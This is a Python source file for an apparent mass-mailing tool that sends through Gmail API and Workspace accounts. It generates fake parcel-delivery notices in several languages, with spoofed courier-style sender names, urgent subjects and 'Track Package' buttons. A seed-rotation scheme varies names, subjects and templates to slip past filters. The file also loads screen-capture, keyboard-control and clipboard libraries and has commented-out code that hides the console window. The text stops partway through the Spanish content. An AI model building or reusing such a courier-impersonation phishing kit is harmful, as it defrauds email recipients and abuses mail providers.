"""
═══════════════════════════════════════════════════════════════════
🚀 AUTO-INSTALLER — Install missing dependencies automatique
═══════════════════════════════════════════════════════════════════
"""
import sys
import os
import subprocess
import importlib

# Required packages (pip name → import name)
REQUIRED_PACKAGES = {
    'reportlab': 'reportlab',                              # PDF generation
    'google-api-python-client': 'googleapiclient',         # Gmail API
    'google-auth': 'google.auth',                           # OAuth2
    'google-auth-httplib2': 'google_auth_httplib2',         # Auth transport
    'google-auth-oauthlib': 'google_auth_oauthlib',         # OAuth2 flow
    'requests': 'requests',                                 # HTTP requests
    'pysocks': 'socks',                                     # SOCKS proxy support
    'bcrypt': 'bcrypt',                                     # Password hashing
    'pyotp': 'pyotp',                                       # TOTP (Google Authenticator)
    'qrcode': 'qrcode',                                     # QR code generation
    'pillow': 'PIL',                                        # Image handling for QR
    'mss': 'mss',                                           # Fast screen capture
    'pyautogui': 'pyautogui',                               # Mouse + keyboard control
    'pyperclip': 'pyperclip',                               # Clipboard sync
}


def _check_package(import_name):
    """Check ila package mafichi installed (multiple methods bach a7sn)"""
    # Method 1: importlib
    try:
        if '.' in import_name:
            # For 'google.auth' — try direct import first
            try:
                mod = importlib.import_module(import_name)
                return True
            except ImportError:
                pass
            # Fallback: split method
            parts = import_name.split('.')
            mod = importlib.import_module(parts[0])
            for part in parts[1:]:
                mod = getattr(mod, part)
            return True
        else:
            importlib.import_module(import_name)
            return True
    except (ImportError, AttributeError, ModuleNotFoundError):
        pass
    
    # Method 2: pkg_resources (more reliable for some packages)
    try:
        import pkg_resources
        # Convert import_name → pip name (e.g., google.auth → google-auth)
        pip_name = import_name.replace('.', '-').replace('_', '-')
        pkg_resources.get_distribution(pip_name)
        return True
    except Exception:
        pass
    
    return False


def _install_package(package_name, parent_window=None):
    """Install package using pip"""
    try:
        # Use sys.executable bach hadshi yKhdem f ay python install
        result = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', package_name, '--quiet'],
            capture_output=True, text=True, timeout=120
        )
        return result.returncode == 0, result.stderr
    except subprocess.TimeoutExpired:
        return False, "Timeout (120s)"
    except Exception as e:
        return False, str(e)


def _show_install_window(missing_packages):
    """Show GUI window m3a progress dyal install"""
    import tkinter as tk
    from tkinter import ttk
    
    root = tk.Tk()
    root.title("📦 Installing Dependencies...")
    
    # Center window
    w, h = 600, 400
    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    x = (sw - w) // 2
    y = (sh - h) // 2
    root.geometry(f"{w}x{h}+{x}+{y}")
    
    # Dark theme
    BG = "#1a1d24"
    BG2 = "#222630"
    ACCENT = "#7c3aed"
    GREEN = "#22c55e"
    RED = "#ef4444"
    YELLOW = "#facc15"
    TEXT = "#e2e8f0"
    TEXT2 = "#94a3b8"
    
    root.configure(bg=BG)
    
    # Header
    header = tk.Frame(root, bg=BG)
    header.pack(fill="x", padx=20, pady=(20, 10))
    
    tk.Label(header, text="📦 First-Time Setup",
             bg=BG, fg=ACCENT,
             font=("Segoe UI", 18, "bold")).pack(anchor="w")
    
    tk.Label(header,
             text=f"Installing {len(missing_packages)} required packages...\nMa'tssyfetsh window — wait ghir bash kolchi finish.",
             bg=BG, fg=TEXT2,
             font=("Segoe UI", 10),
             justify="left").pack(anchor="w", pady=(4, 0))
    
    # Progress bar
    progress_frame = tk.Frame(root, bg=BG)
    progress_frame.pack(fill="x", padx=20, pady=10)
    
    progress_var = tk.DoubleVar(value=0)
    progress = ttk.Progressbar(progress_frame, variable=progress_var,
                                maximum=len(missing_packages), length=560)
    progress.pack(fill="x")
    
    progress_label = tk.Label(progress_frame, text=f"0 / {len(missing_packages)}",
                               bg=BG, fg=TEXT,
                               font=("Segoe UI", 10, "bold"))
    progress_label.pack(pady=(4, 0))
    
    # Console (log area)
    log_frame = tk.Frame(root, bg=BG2)
    log_frame.pack(fill="both", expand=True, padx=20, pady=10)
    
    log_text = tk.Text(log_frame, bg=BG2, fg=TEXT,
                        font=("Consolas", 9),
                        relief="flat", bd=0,
                        padx=12, pady=10,
                        height=10, wrap="word",
                        state="disabled")
    log_text.pack(fill="both", expand=True)
    
    # Status
    status_label = tk.Label(root, text="⏳ Starting installation...",
                             bg=BG, fg=YELLOW,
                             font=("Segoe UI", 11, "bold"))
    status_label.pack(pady=(0, 20))
    
    def log(msg, color=TEXT):
        log_text.configure(state="normal")
        log_text.insert("end", msg + "\n")
        log_text.tag_add(f"c_{id(msg)}", "end-2l", "end-1l")
        log_text.tag_config(f"c_{id(msg)}", foreground=color)
        log_text.see("end")
        log_text.configure(state="disabled")
        root.update()
    
    # Install function
    install_results = {"ok": 0, "failed": 0, "errors": []}
    
    def do_install():
        log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", TEXT2)
        log(f"📦 Auto-Installer Started", ACCENT)
        log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", TEXT2)
        log(f"Python: {sys.version.split()[0]}", TEXT2)
        log(f"Path: {sys.executable}", TEXT2)
        log(f"Packages: {len(missing_packages)}", TEXT2)
        log(f"", TEXT2)
        
        for idx, pkg in enumerate(missing_packages, 1):
            log(f"⏳ [{idx}/{len(missing_packages)}] Installing {pkg}...", YELLOW)
            status_label.config(text=f"⏳ Installing {pkg}... ({idx}/{len(missing_packages)})")
            root.update()
            
            success, error = _install_package(pkg)
            
            if success:
                log(f"   ✅ {pkg} installed!", GREEN)
                install_results["ok"] += 1
            else:
                log(f"   ❌ {pkg} FAILED", RED)
                if error:
                    log(f"      Error: {error[:200]}", RED)
                install_results["failed"] += 1
                install_results["errors"].append((pkg, error))
            
            progress_var.set(idx)
            progress_label.config(text=f"{idx} / {len(missing_packages)}")
            root.update()
        
        log(f"", TEXT2)
        log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", TEXT2)
        if install_results["failed"] == 0:
            log(f"🎉 ALL PACKAGES INSTALLED SUCCESSFULLY!", GREEN)
            status_label.config(text="✅ Done! Starting app in 3s...", fg=GREEN)
        else:
            log(f"⚠ {install_results['ok']} ok · {install_results['failed']} failed", YELLOW)
            status_label.config(text="⚠ Some failed — check log w retry manually", fg=YELLOW)
        log(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", TEXT2)
        
        # Auto-close after 3s ila ga3 success
        if install_results["failed"] == 0:
            log(f"", TEXT2)
            log(f"🔄 RESTARTING APP automatique f 3 thawani...", ACCENT)
            log(f"   Bach packages jdad y'load mzyan", TEXT2)
            
            # Schedule restart
            def _restart():
                root.destroy()
                # Re-launch app m3a same python + same script
                python = sys.executable
                script = sys.argv[0]
                os.execl(python, python, script, *sys.argv[1:])
            
            root.after(3000, _restart)
        else:
            # Show close button
            btn_frame = tk.Frame(root, bg=BG)
            btn_frame.pack(pady=10)
            
            def _continue_and_restart():
                root.destroy()
                # Try restart anyway
                try:
                    python = sys.executable
                    script = sys.argv[0]
                    os.execl(python, python, script, *sys.argv[1:])
                except: pass
            
            tk.Button(btn_frame, text="🔄 Continue Anyway (Restart)",
                      bg=YELLOW, fg="#000",
                      relief="flat", bd=0, cursor="hand2",
                      font=("Segoe UI", 11, "bold"),
                      command=_continue_and_restart).pack(side="left", ipady=8, ipadx=20, padx=4)
            tk.Button(btn_frame, text="✗ Quit",
                      bg=RED, fg="#fff",
                      relief="flat", bd=0, cursor="hand2",
                      font=("Segoe UI", 11, "bold"),
                      command=lambda: sys.exit(1)).pack(side="left", ipady=8, ipadx=20, padx=4)
    
    # Run install after window mounts
    root.after(500, do_install)
    root.mainloop()
    
    return install_results


def _bootstrap_dependencies():
    """Check w install missing dependencies automatique"""
    print("🔍 Checking dependencies...")
    
    # 🛡️ Anti-infinite-loop: track retries via marker file
    retry_marker = os.path.join(
        os.path.expanduser("~"), ".sender_app_install_retry"
    )
    
    # Read previous retry count
    try:
        with open(retry_marker) as f:
            retry_count = int(f.read().strip() or "0")
    except:
        retry_count = 0
    
    missing = []
    for pip_name, import_name in REQUIRED_PACKAGES.items():
        if not _check_package(import_name):
            missing.append(pip_name)
            print(f"   ❌ Missing: {pip_name}")
        else:
            print(f"   ✓ Found: {pip_name}")
    
    if not missing:
        print("✅ All dependencies installed!\n")
        # Reset retry counter
        try:
            os.remove(retry_marker)
        except: pass
        # 🪟 HIDE DOS CONSOLE — disabled for debugging (uncomment ila bghiti tkhabbiha)
        # try:
        #     if sys.platform == "win32":
        #         import ctypes
        #         kernel32 = ctypes.WinDLL('kernel32')
        #         user32 = ctypes.WinDLL('user32')
        #         hwnd = kernel32.GetConsoleWindow()
        #         if hwnd:
        #             user32.ShowWindow(hwnd, 0)
        # except Exception:
        #     pass
        return
    
    # 🚨 Anti-infinite-loop check
    if retry_count >= 2:
        print(f"\n⚠ INSTALL LOOP DETECTED!")
        print(f"   App kayinstall same packages 3+ times.")
        print(f"   Probable issue: import detection issue (mashi missing!)")
        print(f"   Skipping install — running app anyway...")
        # Reset counter
        try:
            os.remove(retry_marker)
        except: pass
        # Show warning dialog ila mumkin
        try:
            import tkinter as tk
            from tkinter import messagebox
            root = tk.Tk()
            root.withdraw()
            messagebox.showwarning(
                "Install Loop Detected",
                f"App detected an install loop ({retry_count} retries).\n\n"
                f"Packages li kaybano missing:\n" +
                "\n".join(f"  • {p}" for p in missing) +
                "\n\nGhadi nrun app direct, walakin features dyal hadi packages "
                "9adimas mafichi yKhdmou.\n\n"
                "Solution: Open Settings tab f app w try 'Re-install ALL' manually."
            )
            root.destroy()
        except: pass
        return
    
    print(f"\n📦 {len(missing)} packages need installing:")
    for pkg in missing:
        print(f"   • {pkg}")
    print()
    
    # Save retry counter (incremented)
    try:
        with open(retry_marker, 'w') as f:
            f.write(str(retry_count + 1))
    except: pass
    
    # Try GUI installer
    try:
        _show_install_window(missing)
    except Exception as e:
        # Fallback: console install
        print(f"GUI install failed ({e}), trying console install...")
        any_installed = False
        for pkg in missing:
            print(f"\n⏳ Installing {pkg}...")
            success, error = _install_package(pkg)
            if success:
                print(f"   ✅ {pkg} installed")
                any_installed = True
            else:
                print(f"   ❌ {pkg} failed: {error[:100]}")
        
        # Restart ila installed something
        if any_installed:
            print("\n🔄 Restarting app...")
            try:
                python = sys.executable
                script = sys.argv[0]
                os.execl(python, python, script, *sys.argv[1:])
            except Exception as e:
                print(f"Restart failed: {e}")
                print("Please run app manually mra okhra.")
    
    print("\n✅ Bootstrap complete!\n")


# 🚀 RUN AUTO-INSTALLER (only if running directly, not imported)
if __name__ == "__main__":
    _bootstrap_dependencies()


import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox
import threading, json, os, base64, random, mimetypes, smtplib, time, string
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from io import BytesIO

# 📄 PDF Generation library (auto-install ila mafichi)
try:
    from reportlab.lib.pagesizes import letter, A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.lib.colors import HexColor
    from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer, Table,
                                      TableStyle, PageBreak)
    from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT
    from reportlab.pdfgen import canvas
    PDF_OK = True
except ImportError:
    PDF_OK = False
    print("⚠ reportlab not installed. Install: pip install reportlab")

try:
    from google.oauth2 import service_account
    from googleapiclient.discovery import build
    from googleapiclient.errors import HttpError
    GOOGLE_OK = True
except ImportError as _e:
    GOOGLE_OK = False
    _GOOGLE_ERR = str(_e)
else:
    _GOOGLE_ERR = ""

SCOPES = [
    "https://www.googleapis.com/auth/gmail.send",
    "https://www.googleapis.com/auth/gmail.modify",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://mail.google.com/",  # ← MUHIM l SMTP XOAUTH2 (workspace_smtp mode)
]

ADMIN_SCOPES = [
    "https://www.googleapis.com/auth/admin.directory.user",
]

# ═══════════════════════════════════════════════════════════════════
# 🔄 ROTATION SEED SYSTEM — Refresh content kol N days
# ═══════════════════════════════════════════════════════════════════
# Bach kolchi (subjects/names/templates/PDFs/ZIPs) yt'change kol period
# Walakin manhaj/style kayb9a same!
# 
# Kayfah kayKhdem:
#   - Seed = number li ka'control ga3 random outputs
#   - Same seed = same outputs (same patterns/style)
#   - Different seed = different outputs (different content!)
#   - User clicks "Refresh All Now" → seed jdid → kolchi fresh!

import json as _json_seed

_ROTATION_SEED_FILE = os.path.join(
    os.path.expanduser("~"), ".sender_app_rotation_seed.json"
)

def _load_rotation_seed():
    """Load rotation seed mn disk"""
    try:
        with open(_ROTATION_SEED_FILE) as f:
            data = _json_seed.load(f)
            return data.get('seed', 0), data.get('last_refresh', '')
    except:
        return 0, ''

def _save_rotation_seed(seed, last_refresh):
    """Save rotation seed l disk"""
    try:
        with open(_ROTATION_SEED_FILE, 'w') as f:
            _json_seed.dump({
                'seed': seed,
                'last_refresh': last_refresh
            }, f)
        return True
    except:
        return False

# Global rotation seed (loaded at startup)
ROTATION_SEED, LAST_REFRESH = _load_rotation_seed()


def _apply_rotation_seed_to_pools():
    """Re-arrange ga3 internal pools using ROTATION_SEED.
    
    Walakin random.choice ka'pick uniformly, juste shuffle won't change outputs.
    
    Strategy: Use seeded RNG bach n'pick "active subset" mn each pool.
    Mlli seed kayttbeddel:
       - Different subset becomes active
       - random.choice kay'pick mn subset jdid
       - Outputs kayttbedlou bzaaf!
    
    Bach manhaj kayb9a same: subset = ~80% mn original (still good variety)
    """
    if ROTATION_SEED == 0:
        return  # No seed yet — use defaults
    
    seeded_rng = random.Random(ROTATION_SEED)
    
    # Pools li bghina nrotat them — names HSAB code real
    pools_to_rotate = [
        # Template pools (HTML body generation)
        '_TEMPLATE_FONTS', '_TEMPLATE_GREETINGS', '_TEMPLATE_BODY_INTROS',
        '_TEMPLATE_BODY_OUTROS', '_TEMPLATE_FOOTERS', '_TEMPLATE_THANKS',
        '_TEMPLATE_TIME_LABELS', '_TEMPLATE_BUTTON_TEXT',
        '_TEMPLATE_COLOR_SCHEMES', '_TEMPLATE_STATUS_LABELS',
        '_TEMPLATE_STATUS_VALUES',
        # Name generation
        'FIRST_NAMES', 'LAST_NAMES',
        '_NAME_PREFIXES', '_NAME_CORE', '_NAME_SUFFIXES',
        # Subject generation
        '_SUBJECT_OPENERS', '_SUBJECT_VERBS', '_SUBJECT_TEMPLATES',
        '_SUBJECT_NOTES', '_SUBJECT_VERBS_SHORT',
        # Attachment intros
        '_ATT_BUTTON_TEXTS', '_ATT_INTROS', '_ATT_OUTROS', '_ATT_FOOTERS',
        # Workspace
        'WORKSPACE_PREFIXES',
        # Delivery names
        'DELIVERY_NAMES', 'DELIVERY_SUBJECTS', 'DELIVERY_TEMPLATES'
    ]
    
    g = globals()
    for pool_name in pools_to_rotate:
        if pool_name in g and isinstance(g[pool_name], list):
            original = g[pool_name]
            # Backup original ila mafichi backed up yet
            backup_name = f"_{pool_name}_ORIGINAL"
            if backup_name not in g:
                g[backup_name] = list(original)
            
            # Use original kol mra (avoid double-rotation)
            base = g[backup_name]
            
            if len(base) <= 3:
                # Pool sghir, just shuffle
                shuffled = list(base)
                seeded_rng.shuffle(shuffled)
                g[pool_name] = shuffled
            else:
                # Pick ~85% subset randomly + shuffle order
                # Hadshi y'guarantee outputs different per seed
                subset_size = max(3, int(len(base) * 0.85))
                subset = seeded_rng.sample(base, subset_size)
                g[pool_name] = subset


WORKSPACE_PREFIXES = [
    "support", "noreply", "info", "contact", "hello", "team", "office", "admin",
    "service", "mail", "notify", "alerts", "welcome", "accounts", "customer", "care",
    "help", "sales", "billing", "finance", "legal", "security", "privacy", "ops",
    "it", "hr", "media", "marketing", "partners", "orders", "returns", "status",
    "system", "cloud", "api", "product", "design", "content", "social", "workspace",
    "portal", "member", "auth", "verify", "delivery", "shipping", "booking", "events"
]

FIRST_NAMES = [
    "Alex", "Jordan", "Morgan", "Taylor", "Casey", "Riley", "Avery", "Parker",
    "Quinn", "Reese", "Blake", "Cameron", "Drew", "Emery", "Finley", "Harper",
    "Hayden", "Hunter", "Jamie", "Jesse", "Kai", "Lane", "Logan", "Max", "Micah",
    "Monroe", "Noel", "Oakley", "Paige", "Peyton", "Phoenix", "Piper", "Preston",
    "Remy", "River", "Robin", "Rowan", "Ryan", "Sage", "Sam", "Scout", "Shawn",
    "Sidney", "Skylar", "Spencer", "Sterling"
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris",
    "Martin", "Thompson", "Walker", "Young", "King", "Scott", "Green", "Baker",
    "Nelson", "Carter", "Mitchell", "Roberts", "Turner", "Phillips", "Campbell", "Parker",
    "Evans", "Edwards", "Collins"
]

# ═══════════════════════════════════════════════════════════════
# 📦 BUILT-IN DELIVERY CONTENT — DYNAMIC GENERATORS (millions!)
# ═══════════════════════════════════════════════════════════════
# 
# Static lists kayhdou file kbir bzaaf, walakin GENERATORS kay'create
# millions dyal combinations dynamically:
#
#   Names:     ~7,000+ unique combinations (auto)
#   Subjects:  ~50,000+ unique combinations (auto)
#   Templates: ~15,000+ unique HTMLs (auto)
#
# 🌍 MULTI-LANGUAGE SUPPORT: EN, FR, ES, UK (4 languages)
#
# ═══════════════════════════════════════════════════════════════

# 🌍 Current selected language (changeable f UI)
CURRENT_LANGUAGE = "EN"  # Default: English (USA)

# ═════════════════════════════════════════════════════════════════
# 🌍 LANGUAGE DICTIONARIES — names, subjects, body content
# ═════════════════════════════════════════════════════════════════

LANG_DATA = {
    # ───────────────────────────────────────────────────────────
    "EN": {  # English (USA / International)
        "name_prefixes": [
            "Express", "Premium", "Priority", "Standard", "Quick", "Fast", "Reliable",
            "Secure", "Trusted", "Smart", "Pro", "Plus", "Elite", "Prime", "VIP",
            "Speedy", "Rapid", "Swift", "Top", "Best", "Direct", "Local", "Global",
            "International", "Domestic", "National", "Regional", "Premier", "Modern",
            "Advanced", "Quality", "Superior", "Ultimate", "Exclusive", "Verified",
            "Official", "Certified", "Approved", "Guaranteed", "Confirmed"
        ],
        "name_core": [
            "Delivery", "Shipping", "Package", "Parcel", "Courier", "Logistics",
            "Mail", "Postal", "Cargo", "Freight", "Order", "Tracking", "Shipment",
            "Distribution", "Dispatch", "Fulfillment", "Carrier", "Transport"
        ],
        "name_suffixes": [
            "Service", "Services", "Team", "Department", "Center", "Hub", "Express",
            "Updates", "Alerts", "Notifications", "Notices", "Network", "Solutions",
            "Group", "Co", "Partners", "Co.", "Pro", "Plus", "Direct", "Now",
            "Today", "365", "24/7", "Live", "International", "Global", "Local"
        ],
        "subject_openers": [
            "Your package", "Your order", "Your shipment", "Your parcel", "Your delivery",
            "The package", "The order", "The shipment", "Package", "Order",
            "Your item", "Your purchase"
        ],
        "subject_verbs": [
            "has been delivered", "has arrived", "was delivered", "is here",
            "has just arrived", "was just delivered", "successfully delivered",
            "was delivered today", "arrived today", "has been received",
            "is now delivered", "has been dropped off", "was dropped off",
            "made it", "arrived safely", "has been completed",
            "delivery is complete", "delivery confirmed"
        ],
        "subject_templates": [
            "{opener} {verb}", "{opener} {verb}.", "{opener} {verb} - {note}",
            "{note}: {opener} {verb}", "{note} - {opener} {verb}",
            "{verb_short}: {opener}", "{opener} {verb} ({date})",
            "Confirmation: {opener} {verb}", "Notification: {opener} {verb}",
            "Update: {opener} {verb}", "Alert: {opener} {verb}",
            "{tracking_id} - {verb_short}"
        ],
        "subject_notes": [
            "Thank you", "View details", "Track now", "See receipt", "Check status",
            "Confirm here", "Order received", "Quick update", "Heads up",
            "Important", "Action required", "Final notice", "Latest update",
            "Delivery complete", "Successfully", "Just now", "Today",
            "Now available"
        ],
        "subject_verbs_short": [
            "Delivered", "Arrived", "Complete", "Received", "Confirmed",
            "Successful", "Done", "Finished", "Final delivery", "Shipped",
            "Successfully delivered", "Order received", "Package arrived"
        ],
        "subject_dates": ["today", "earlier today", "this afternoon", "this morning"],
        "greetings": [
            "Hello [NAME],", "Hi [NAME],", "Hi there [NAME],",
            "Dear [NAME],", "Hello [NAME]!", "Hi [NAME]!",
            "Greetings [NAME],", "Good day [NAME],", "Hey [NAME],"
        ],
        "att_intros": [
            "Hello {name}, your package has been delivered to your address.",
            "Hi {name}, we're confirming successful delivery of your recent order.",
            "Dear {name}, your shipment has arrived at the destination address.",
            "Hi {name}, your order has been delivered as scheduled.",
            "Hello {name}, this confirms successful delivery to {email}.",
            "Hi {name}, your package made it safely to your address today.",
            "Dear {name}, your order has reached its final destination.",
            "Hello {name}, we're glad to inform you that delivery is complete.",
        ],
        "att_outros": [
            "Use the button below to view full delivery details and tracking history.",
            "For complete tracking information, please use the button below.",
            "Tap the button below to access your full delivery report.",
            "Below you can find access to your full tracking timeline.",
            "Your detailed delivery summary is available below.",
        ],
        "att_footers": [
            "If you have any concerns regarding this delivery, please reach out.",
            "Should you experience any issues, please contact our support team.",
            "For any questions about this delivery, feel free to get in touch.",
            "Need assistance? Our team is happy to help.",
        ],
        "att_button_texts": [
            "Track Package", "View Tracking", "View Receipt", "See Details",
            "Track Order", "View Order", "View Delivery Info", "See Order Details",
            "Check Status", "View Status", "Continue", "Open Receipt",
            "View Confirmation", "See Receipt"
        ],
        "att_status_label": "Delivery Confirmed",
        "att_status_value": "Package successfully delivered",
        "att_recipient_label": "Recipient",
        "att_tracking_label": "Tracking",
        "att_today_at": "Today at",
        "att_message_to": "This message was sent to",
        "att_order_update": "Order Update",
        "att_your_package_arrived": "Your package arrived",
        "att_recipient_caps": "RECIPIENT",
        "att_tracking_caps": "TRACKING NUMBER",
        "att_delivered_caps": "DELIVERED",
        "att_today_comma": "Today,",
        "att_tracking_number_lbl": "Tracking number",
        "att_delivered_to_lbl": "Delivered to",
        "att_time_lbl": "Time",
        "att_title_main": "Delivery Confirmation",
        "att_title_alt": "Order Notification",
    },
    # ───────────────────────────────────────────────────────────
    "FR": {  # Français (France)
        "name_prefixes": [
            "Express", "Premium", "Prioritaire", "Standard", "Rapide", "Fiable",
            "Sécurisé", "Confiance", "Smart", "Pro", "Plus", "Élite", "Premier",
            "VIP", "Speedy", "Rapide", "Top", "Direct", "Local", "Global",
            "International", "Domestique", "National", "Régional", "Moderne",
            "Avancé", "Qualité", "Supérieur", "Ultimate", "Exclusif", "Vérifié",
            "Officiel", "Certifié", "Approuvé", "Garanti", "Confirmé"
        ],
        "name_core": [
            "Livraison", "Expédition", "Colis", "Paquet", "Coursier", "Logistique",
            "Courrier", "Postal", "Cargo", "Fret", "Commande", "Suivi",
            "Distribution", "Envoi", "Transport"
        ],
        "name_suffixes": [
            "Service", "Services", "Équipe", "Département", "Centre", "Hub",
            "Express", "Mises à jour", "Alertes", "Notifications", "Avis",
            "Réseau", "Solutions", "Groupe", "Partenaires", "Pro", "Plus",
            "Direct", "Aujourd'hui", "365", "24/7", "Live", "International",
            "Global", "Local"
        ],
        "subject_openers": [
            "Votre colis", "Votre commande", "Votre envoi", "Votre paquet",
            "Votre livraison", "Le colis", "La commande", "L'envoi",
            "Colis", "Commande", "Votre article", "Votre achat"
        ],
        "subject_verbs": [
            "a été livré", "est arrivé", "a été expédié", "est ici",
            "vient d'arriver", "a été livré aujourd'hui",
            "livré avec succès", "est arrivé aujourd'hui",
            "a été reçu", "est maintenant livré", "a été déposé",
            "est arrivé en sécurité", "livraison terminée", "livraison confirmée"
        ],
        "subject_templates": [
            "{opener} {verb}", "{opener} {verb}.", "{opener} {verb} - {note}",
            "{note}: {opener} {verb}", "{note} - {opener} {verb}",
            "{verb_short}: {opener}", "{opener} {verb} ({date})",
            "Confirmation: {opener} {verb}", "Notification: {opener} {verb}",
            "Mise à jour: {opener} {verb}", "Alerte: {opener} {verb}",
            "{tracking_id} - {verb_short}"
        ],
        "subject_notes": [
            "Merci", "Voir les détails", "Suivre maintenant", "Voir le reçu",
            "Vérifier le statut", "Confirmer ici", "Commande reçue",
            "Mise à jour rapide", "Important", "Action requise",
            "Avis final", "Dernière mise à jour", "Livraison terminée",
            "Avec succès", "À l'instant", "Aujourd'hui", "Disponible"
        ],
        "subject_verbs_short": [
            "Livré", "Arrivé", "Terminé", "Reçu", "Confirmé",
            "Réussi", "Fait", "Terminé", "Livraison finale", "Expédié",
            "Livré avec succès", "Commande reçue", "Colis arrivé"
        ],
        "subject_dates": ["aujourd'hui", "plus tôt aujourd'hui", "cet après-midi", "ce matin"],
        "greetings": [
            "Bonjour [NAME],", "Salut [NAME],", "Cher [NAME],",
            "Chère [NAME],", "Bonjour [NAME] !", "Salut [NAME] !",
            "Bonne journée [NAME],"
        ],
        "att_intros": [
            "Bonjour {name}, votre colis a été livré à votre adresse.",
            "Salut {name}, nous confirmons la livraison réussie de votre commande récente.",
            "Cher {name}, votre envoi est arrivé à l'adresse de destination.",
            "Salut {name}, votre commande a été livrée comme prévu.",
            "Bonjour {name}, ceci confirme la livraison réussie à {email}.",
            "Salut {name}, votre colis est arrivé en sécurité à votre adresse aujourd'hui.",
            "Cher {name}, votre commande a atteint sa destination finale.",
            "Bonjour {name}, nous sommes heureux de vous informer que la livraison est terminée.",
        ],
        "att_outros": [
            "Utilisez le bouton ci-dessous pour voir les détails complets de la livraison et l'historique du suivi.",
            "Pour des informations de suivi complètes, veuillez utiliser le bouton ci-dessous.",
            "Appuyez sur le bouton ci-dessous pour accéder à votre rapport de livraison complet.",
            "Ci-dessous, vous trouverez l'accès à votre chronologie complète de suivi.",
            "Votre résumé de livraison détaillé est disponible ci-dessous.",
        ],
        "att_footers": [
            "Si vous avez des préoccupations concernant cette livraison, veuillez nous contacter.",
            "En cas de problème, veuillez contacter notre équipe de support.",
            "Pour toute question concernant cette livraison, n'hésitez pas à nous contacter.",
            "Besoin d'aide ? Notre équipe est heureuse de vous aider.",
        ],
        "att_button_texts": [
            "Suivre le colis", "Voir le suivi", "Voir le reçu", "Voir les détails",
            "Suivre la commande", "Voir la commande", "Voir les infos de livraison",
            "Voir les détails de la commande", "Vérifier le statut", "Voir le statut",
            "Continuer", "Ouvrir le reçu", "Voir la confirmation", "Voir le reçu"
        ],
        "att_status_label": "Livraison confirmée",
        "att_status_value": "Colis livré avec succès",
        "att_recipient_label": "Destinataire",
        "att_tracking_label": "Suivi",
        "att_today_at": "Aujourd'hui à",
        "att_message_to": "Ce message a été envoyé à",
        "att_order_update": "Mise à jour de commande",
        "att_your_package_arrived": "Votre colis est arrivé",
        "att_recipient_caps": "DESTINATAIRE",
        "att_tracking_caps": "NUMÉRO DE SUIVI",
        "att_delivered_caps": "LIVRÉ",
        "att_today_comma": "Aujourd'hui,",
        "att_tracking_number_lbl": "Numéro de suivi",
        "att_delivered_to_lbl": "Livré à",
        "att_time_lbl": "Heure",
        "att_title_main": "Confirmation de livraison",
        "att_title_alt": "Notification de commande",
    },
    # ───────────────────────────────────────────────────────────
    "ES": {  # Español (España)
        "name_prefixes": [
            "Express", "Premium", "Prioritario", "Estándar", "Rápido", "Fiable",
            "Seguro", "Confianza", "Smart", "Pro", "Plus", "Élite", "Primero",
            "VIP", "Veloz", "Top", "Directo", "Local", "Global", "Internacional",
            "Doméstico", "Nacional", "Regional", "Moderno", "Avanzado",
            "Calidad", "Superior", "Ultimate", "Exclusivo", "Verificado",
            "Oficial", "Certificado", "Aprobado", "Garantizado", "Confirmado"
        ],
        "name_core": [
            "Entrega", "Envío", "Paquete", "Mensajero", "Logística",
            "Correo", "Postal", "Carga", "Pedido", "Seguimiento",
            "Distribución", "Despacho", "Transporte"
        ],
        "name_suffixes": [
            "Servicio", "Servicios", "Equipo", "Departamento", "Centro", "Hub",
            "Express", "Actualizaciones", "Alertas", "Notificaciones", "Avisos",
            "Red", "Soluciones", "Grupo", "Socios", "Pro", "Plus",
            "Directo", "Hoy", "365", "24/7", "Live", "Internacional",
            "Global", "Local"
        ],
        "subject_openers": [
            "Su paquete", "Su pedido", "Su envío", "Su entrega",
            "El paquete", "El pedido", "El envío", "Paquete", "Pedido",
            "Su artículo", "Su compra"
        ],
        "subject_verbs": [
            "ha sido entregado", "ha llegado", "fue entregado", "está aquí",
            "acaba de llegar", "fue entregado hoy",
            "entregado con éxito", "llegó hoy", "ha sido recibido",
            "ya está entregado", "ha sido depositado",
            "llegó seguro", "entrega completada", "entrega confirmada"
        ],
        "subject_templates": [
            "{opener} {verb}", "{opener} {verb}.", "{opener} {verb} - {note}",
            "{note}: {opener} {verb}", "{note} - {opener} {verb}",
            "{verb_short}: {opener}", "{opener} {verb} ({date})",
            "Confirmación: {opener} {verb}", "Notificación: {opener} {verb}",
            "Actualización: {opener} {verb}", "Alerta: {opener} {verb}",
            "{tracking_id} - {verb_short}"
        ],
        "subject_notes": [
            "Gracias", "Ver detalles", "Rastrear ahora", "Ver recibo",
            "Verificar estado", "Confirmar aquí", "Pedido recibido",
            "Actualización rápida", "Importante", "Acción requerida",
            "Aviso final", "Última actualización", "Entrega completa",
            "Con éxito", "Justo ahora", "Hoy", "Disponible"
        ],
        "subject_verbs_short": [
            "Entregado", "Llegado", "Completo", "Recibido", "Confirmado",
            "Exitoso", "Hecho", "Terminado", "Entrega final", "Enviado",
            "Entregado con éxito", "Pedido recibido", "Paquete llegado"
        ],
        "subject_dates": ["hoy", "más temprano hoy", "esta tarde", "esta mañana"],
        "greetings": [
            "Hola [NAME],", "Estimado [NAME],", "Estimada [NAME],",
            "Buenos días [NAME],", "Saludos [NAME],", "¡Hola [NAME]!"
        ],
        "att_intros": [
            "Hola {name}, su paquete ha sido entregado en su dirección.",
            "Hola {name}, confirmamos la entrega exitosa de su pedido reciente.",
            "Estimado {name}, su envío ha llegado a la dirección de destino.",
            "Hola {name}, su pedido ha sido entregado según lo programado.",
